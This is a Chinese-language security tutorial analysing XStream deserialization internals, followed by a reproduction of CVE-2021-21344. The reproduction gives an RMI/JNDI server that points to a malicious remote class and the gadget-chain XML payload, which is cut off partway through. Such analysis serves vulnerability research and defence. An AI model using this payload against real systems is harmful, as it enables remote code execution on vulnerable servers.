<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="aac04f02b3cdd439caf222cfece9a18f">Java安全之XStream漏洞分析与利用</h1>
<h2 data-content="1" id="e29db6801a8c73b7c6b3125a2bc37a2e">1. 简介</h2>
<p>官方文档描述：</p>
<blockquote>
<p>XStream is designed to be an easy to use library. It takes its main task seriously: converting Java objects to XML, and XML to Java objects. As a result, it is possible to create an instance of XStream with the default constructor, call a method to convert an object into XML, then call another method to turn the XML back into an equivalent Java object. By design, there are few limits to the type of objects XStream can handle.</p>
<p>简单来说，XStream是一个能将Java对象和XML相互转换的Java库。</p>
</blockquote>
<p>导入Maven依赖：</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;dependency&gt;</span>
    <span class="nt">&lt;groupId&gt;</span>com.thoughtworks.xstream<span class="nt">&lt;/groupId&gt;</span>
    <span class="nt">&lt;artifactId&gt;</span>xstream<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>1.4.4<span class="nt">&lt;/version&gt;</span>
<span class="nt">&lt;/dependency&gt;</span>
</pre></div>
<p><strong>示例1</strong>：Java对象没有实现反序列化接口并重写readObject方法<br/>
Person类：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">Xstream</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Person</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kt">int</span> <span class="n">age</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">Person</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">int</span> <span class="n">age</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">age</span> <span class="o">=</span> <span class="n">age</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getAge</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">age</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAge</span><span class="o">(</span><span class="kt">int</span> <span class="n">age</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">age</span> <span class="o">=</span> <span class="n">age</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="s">"Person{"</span> <span class="o">+</span>
                <span class="s">"name='"</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="sc">'\''</span> <span class="o">+</span>
                <span class="s">", age="</span> <span class="o">+</span> <span class="n">age</span> <span class="o">+</span>
                <span class="sc">'}'</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>测试类：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">Xstream</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">com.thoughtworks.xstream.XStream</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">XstreamTest1</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Person</span> <span class="n">person</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Person</span><span class="o">(</span><span class="s">"lucy"</span><span class="o">,</span> <span class="mi">22</span><span class="o">);</span>
        <span class="n">XStream</span> <span class="n">xStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XStream</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">xml</span> <span class="o">=</span> <span class="n">xStream</span><span class="o">.</span><span class="na">toXML</span><span class="o">(</span><span class="n">person</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>运行结果：</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;Xstream.Person&gt;</span>
  <span class="nt">&lt;name&gt;</span>lucy<span class="nt">&lt;/name&gt;</span>
  <span class="nt">&lt;age&gt;</span>22<span class="nt">&lt;/age&gt;</span>
<span class="nt">&lt;/Xstream.Person&gt;</span>
</pre></div>
<p><strong>示例2</strong>：Java对象继承了反序列化接口并重写了readObject方法<br/>
Car类：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">Xstream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Car</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kt">int</span> <span class="n">price</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">Car</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">int</span> <span class="n">price</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">price</span> <span class="o">=</span> <span class="n">price</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getPrice</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">price</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setPrice</span><span class="o">(</span><span class="kt">int</span> <span class="n">price</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">price</span> <span class="o">=</span> <span class="n">price</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
        <span class="n">s</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Print Car"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>测试类：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">Xstream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.thoughtworks.xstream.XStream</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">XstreamTest2</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Car</span> <span class="n">car</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Car</span><span class="o">(</span><span class="s">"benchi"</span><span class="o">,</span> <span class="mi">2000000</span><span class="o">);</span>
        <span class="n">XStream</span> <span class="n">xStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XStream</span><span class="o">();</span>
        <span class="n">String</span> <span class="n">xml</span> <span class="o">=</span> <span class="n">xStream</span><span class="o">.</span><span class="na">toXML</span><span class="o">(</span><span class="n">car</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>运行结果：</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;Xstream.Car</span> <span class="na">serialization=</span><span class="s">"custom"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;Xstream.Car&gt;</span>
    <span class="nt">&lt;default&gt;</span>
      <span class="nt">&lt;price&gt;</span>2000000<span class="nt">&lt;/price&gt;</span>
      <span class="nt">&lt;name&gt;</span>benchi<span class="nt">&lt;/name&gt;</span>
    <span class="nt">&lt;/default&gt;</span>
  <span class="nt">&lt;/Xstream.Car&gt;</span>
<span class="nt">&lt;/Xstream.Car&gt;</span>
</pre></div>
<p>结论：Xstream在处理继承了Serializable与没有继承Serializable接口的类时，所用的方法不一致</p>
<p><strong>示例3</strong>：反序列化示例</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">Xstream</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.thoughtworks.xstream.XStream</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">XstreamTest2</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// 反序列化</span>
        <span class="n">String</span> <span class="n">xml</span> <span class="o">=</span> <span class="s">"&lt;Xstream.Car serialization=\"custom\"&gt;\n"</span> <span class="o">+</span>
                <span class="s">"  &lt;Xstream.Car&gt;\n"</span> <span class="o">+</span>
                <span class="s">"    &lt;default&gt;\n"</span> <span class="o">+</span>
                <span class="s">"      &lt;price&gt;2000000&lt;/price&gt;\n"</span> <span class="o">+</span>
                <span class="s">"      &lt;name&gt;benchi&lt;/name&gt;\n"</span> <span class="o">+</span>
                <span class="s">"    &lt;/default&gt;\n"</span> <span class="o">+</span>
                <span class="s">"  &lt;/Xstream.Car&gt;\n"</span> <span class="o">+</span>
                <span class="s">"&lt;/Xstream.Car&gt;"</span><span class="o">;</span>
        <span class="n">XStream</span> <span class="n">xStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XStream</span><span class="o">();</span>
        <span class="n">Car</span> <span class="n">car</span> <span class="o">=</span> <span class="o">(</span><span class="n">Car</span><span class="o">)</span> <span class="n">xStream</span><span class="o">.</span><span class="na">fromXML</span><span class="o">(</span><span class="n">xml</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">car</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>运行结果：</p>
<div class="highlight"><pre><span></span><span class="n">Print</span> <span class="n">Car</span>
<span class="n">Xstream</span><span class="o">.</span><span class="na">Car</span><span class="err">@</span><span class="mi">35</span><span class="n">d176f7</span>
</pre></div>
<p>注：在反序列化中，Car必须要有无参数的构造方法</p>
<h2 data-content="1" id="b73c2ac068fc5839bbb4d3bbeb818bd6">2. 反序列化分析</h2>
<p>在Car类重写的readObject函数上下断点，看XStream的fromXML过程是否会反序列化调用重写的readObject函数<br/>
函数调用栈：</p>
<div class="highlight"><pre><span></span><span class="nl">readObject:</span><span class="mi">37</span><span class="o">,</span> <span class="n">Car</span> <span class="o">(</span><span class="n">Xstream</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">498</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">callReadObject:</span><span class="mi">113</span><span class="o">,</span> <span class="n">SerializationMethodInvoker</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">converters</span><span class="o">.</span><span class="na">reflection</span><span class="o">)</span>
<span class="nl">doUnmarshal:</span><span class="mi">425</span><span class="o">,</span> <span class="n">SerializableConverter</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">converters</span><span class="o">.</span><span class="na">reflection</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">234</span><span class="o">,</span> <span class="n">AbstractReflectionConverter</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">converters</span><span class="o">.</span><span class="na">reflection</span><span class="o">)</span>
<span class="nl">convert:</span><span class="mi">72</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convert:</span><span class="mi">65</span><span class="o">,</span> <span class="n">AbstractReferenceUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convertAnother:</span><span class="mi">66</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">convertAnother:</span><span class="mi">50</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">start:</span><span class="mi">134</span><span class="o">,</span> <span class="n">TreeUnmarshaller</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">32</span><span class="o">,</span> <span class="n">AbstractTreeMarshallingStrategy</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">.</span><span class="na">core</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">1058</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">unmarshal:</span><span class="mi">1042</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">fromXML:</span><span class="mi">913</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">fromXML:</span><span class="mi">904</span><span class="o">,</span> <span class="n">XStream</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">thoughtworks</span><span class="o">.</span><span class="na">xstream</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">23</span><span class="o">,</span> <span class="n">XstreamTest2</span> <span class="o">(</span><span class="n">Xstream</span><span class="o">)</span>
</pre></div>
<p>结论是如果目标对象实现了readObject函数的话，最终会调用此函数</p>
<p>在com.thoughtworks.xstream.core的convertAnother函数中，会调用lookupConverterForType函数根据type选择正确的converter</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Object</span> <span class="nf">convertAnother</span><span class="o">(</span><span class="n">Object</span> <span class="n">parent</span><span class="o">,</span> <span class="n">Class</span> <span class="n">type</span><span class="o">,</span> <span class="n">Converter</span> <span class="n">converter</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">type</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="na">defaultImplementationOf</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">converter</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">converter</span> <span class="o">=</span> <span class="n">converterLookup</span><span class="o">.</span><span class="na">lookupConverterForType</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(!</span><span class="n">converter</span><span class="o">.</span><span class="na">canConvert</span><span class="o">(</span><span class="n">type</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">ConversionException</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ConversionException</span><span class="o">(</span>
                <span class="s">"Explicit selected converter cannot handle type"</span><span class="o">);</span>
            <span class="n">e</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"item-type"</span><span class="o">,</span> <span class="n">type</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
            <span class="n">e</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"converter-type"</span><span class="o">,</span> <span class="n">converter</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
            <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">convert</span><span class="o">(</span><span class="n">parent</span><span class="o">,</span> <span class="n">type</span><span class="o">,</span> <span class="n">converter</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>在执行到com/thoughtworks/xstream/core/DefaultConverterLookup.java的lookupConverterForType函数时，会根据type选择converter</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Converter</span> <span class="nf">lookupConverterForType</span><span class="o">(</span><span class="n">Class</span> <span class="n">type</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Converter</span> <span class="n">cachedConverter</span> <span class="o">=</span> <span class="o">(</span><span class="n">Converter</span><span class="o">)</span> <span class="n">typeToConverterMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">cachedConverter</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">cachedConverter</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">converters</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
    <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">Converter</span> <span class="n">converter</span> <span class="o">=</span> <span class="o">(</span><span class="n">Converter</span><span class="o">)</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">converter</span><span class="o">.</span><span class="na">canConvert</span><span class="o">(</span><span class="n">type</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">typeToConverterMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">type</span><span class="o">,</span> <span class="n">converter</span><span class="o">);</span>
            <span class="k">return</span> <span class="n">converter</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="n">ConversionException</span><span class="o">(</span><span class="s">"No converter specified for "</span> <span class="o">+</span> <span class="n">type</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>iterator中总共有57个，逐个匹配<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814211943-3b8391d0-3aa5-1.png"/><br/>
这里的converter是SerializableConverter<br/>
在试试如果目标对象没有实现readObject函数，在fromXML过程中会发生什么？<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212020-51a8c520-3aa5-1.png"/><br/>
同样在经过lookupConverterForType函数后，其converter是ReflectionConverter</p>
<p><strong>总结</strong><br/>
总而言之，XStream为Java常见的类型提供了不同的转换器，其思路就是通过不同的converter来处理序列化数据中不同类型的数据</p>
<h2 data-content="1" id="5eafd8a6aaa2baca530939ff623498af">3. 漏洞汇总</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212046-60b41f10-3aa5-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230814212104-6b6379f6-3aa5-1.png"/><br/>
参考：<a href="https://x-stream.github.io/security.html" target="_blank">https://x-stream.github.io/security.html</a></p>
<h2 data-content="1" id="8224ed6fa2e13a74087b1d76af6841db">4. CVE-2021-21344</h2>
<p><strong>影响版本</strong>：&lt;=1.4.15<br/>
<strong>测试环境</strong>：XStream1.4.15   jdk1.8_66<br/>
<strong>复现</strong>：<br/>
继续使用JNDI中用到的RMI Server：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">JNDI</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.naming.Reference</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ReferServer</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">7777</span><span class="o">);</span>

        <span class="c1">// 创建Reference对象</span>
        <span class="n">Reference</span> <span class="n">reference</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reference</span><span class="o">(</span><span class="s">"test"</span><span class="o">,</span> <span class="s">"test"</span><span class="o">,</span> <span class="s">"http://127.0.0.1:8080/"</span><span class="o">);</span>
        <span class="c1">// 由于Reference类没有继承Remote接口, 所以需要使用ReferenceWrapper进行封装</span>
        <span class="n">ReferenceWrapper</span> <span class="n">wrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">reference</span><span class="o">);</span>
        <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span> <span class="n">wrapper</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>test是一个恶意类，在其对应的文件夹开启web服务<br/>
POC：官方给出的POC，需要修改其里面的RMI地址</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;java.util.PriorityQueue</span> <span class="na">serialization=</span><span class="s">'custom'</span><span class="nt">&gt;</span>
  <span class="nt">&lt;unserializable-parents/&gt;</span>
  <span class="nt">&lt;java.util.PriorityQueue&gt;</span>
    <span class="nt">&lt;default&gt;</span>
      <span class="nt">&lt;size&gt;</span>2<span class="nt">&lt;/size&gt;</span>
      <span class="nt">&lt;comparator</span> <span class="na">class=</span><span class="s">'sun.awt.datatransfer.DataTransferer$IndexOrderComparator'</span><span class="nt">&gt;</span>
        <span class="nt">&lt;indexMap</span> <span class="na">class=</span><span class="s">'com.sun.xml.internal.ws.client.ResponseContext'</span><span class="nt">&gt;</span>
          <span class="nt">&lt;packet&gt;</span>
            <span class="nt">&lt;message</span> <span class="na">class=</span><span class="s">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'</span><span class="nt">&gt;</span>
              <span class="nt">&lt;dataSource</span> <span class="na">class=</span><span class="s">'com.sun.xml.internal.ws.message.JAXBAttachment'</span><span class="nt">&gt;</span>
                <span class="nt">&lt;bridge</span> <span class="na">class=</span><span class="s">'com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'</span><span class="nt">&gt;</span>
                  <span class="nt">&lt;bridge</span> <span class="na">class=</span><span class="s">'com.sun.xml.internal.bind.v2.runtime.BridgeImpl'</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;bi</span> <span class="na">class=</span><span class="s">'com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'</span><span class="nt">&gt;</span>
                      <span class="nt">&lt;jaxbType&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="nt">&lt;/jaxbType&gt;</span>
                      <span class="nt">&lt;uriProperties/&gt;</span>
                      <span class="nt">&lt;attributeProperties/&gt;</span>
                      <span class="nt">&lt;inheritedAttWildcard</span> <span class="na">class=</span><span class="s">'com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;getter&gt;</span>
                          <span class="nt">&lt;class&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="nt">&lt;/class&gt;</span>
                          <span class="nt">&lt;name&gt;</span>getDatabaseMetaData<span class="nt">&lt;/name&gt;</span>
                          <span class="nt">&lt;parameter-types/&gt;</span>
                        <span class="nt">&lt;/getter&gt;</span>
                      <span class="nt">&lt;/inheritedAttWildcard&gt;</span>
                    <span class="nt">&lt;/bi&gt;</span>
                    <span class="nt">&lt;tagName/&gt;</span>
                    <span class="nt">&lt;context&gt;</span>
                      <span class="nt">&lt;marshallerPool</span> <span class="na">class=</span><span class="s">'com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;outer-class</span> <span class="na">reference=</span><span class="s">'../..'</span><span class="nt">/&gt;</span>
                      <span class="nt">&lt;/marshallerPool&gt;</span>
                      <span class="nt">&lt;nameList&gt;</span>
                        <span class="nt">&lt;nsUriCannotBeDefaulted&gt;</span>
                          <span class="nt">&lt;boolean&gt;</span>true<span class="nt">&lt;/boolean&gt;</span>
                        <span class="nt">&lt;/nsUriCannotBeDefaulted&gt;</span>
                        <span class="nt">&lt;namespaceURIs&gt;</span>
                          <span class="nt">&lt;string&gt;</span>1<span class="nt">&lt;/string&gt;</span>
                        <span class="nt">&lt;/namespaceURIs&gt;</span>
                        <span class="nt">&lt;localNames&gt;</span>
                          <span class="nt">&lt;string&gt;</span>UTF-8<span class="nt">&lt;/string&gt;</span>
                        <span class="nt">&lt;/localNames&gt;</span>
                      <span class="nt">&lt;/nameList&gt;</span>
                    <span class="nt">&lt;/context&gt;</span>
                  <span class="nt">&lt;/bridge&gt;</span>
                <span class="nt">&lt;/bridge&gt;</span>
                <span class="nt">&lt;jaxbObject</span> <span class="na">class=</span><span class="s">'com.sun.rowset.JdbcRowSetImpl'</span> <span class="na">serialization=</span><span class="s">'custom'</span><span class="nt">&gt;</span>
                  <span class="nt">&lt;javax.sql.rowset.BaseRowSet&gt;</span>
                    <span class="nt">&lt;default&gt;</span>
                      <span class="nt">&lt;concurrency&gt;</span>1008<span class="nt">&lt;/concurrency&gt;</span>
                      <span class="nt">&lt;escapeProcessing&gt;</span>true<span class="nt">&lt;/escapeProcessing&gt;</span>
                      <span class="nt">&lt;fetchDir&gt;</span>1000<span class="nt">&lt;/fetchDir&gt;</span>
                      <span class="nt">&lt;fetchSize&gt;</span>0<span class="nt">&lt;/fetchSize&gt;</span>
                      <span class="nt">&lt;isolation&gt;</span>2<span class="nt">&lt;/isolation&gt;</span>
                      <span class="nt">&lt;maxFieldSize&gt;</span>0<span class="nt">&lt;/maxFieldSize&gt;</span>
                      <span class="nt">&lt;maxRows&gt;</span>0<span class="nt">&lt;/maxRows&gt;</span>
                      <span class="nt">&lt;queryTimeout&gt;</span>0<span class="nt">&lt;/queryTimeout&gt;</span>
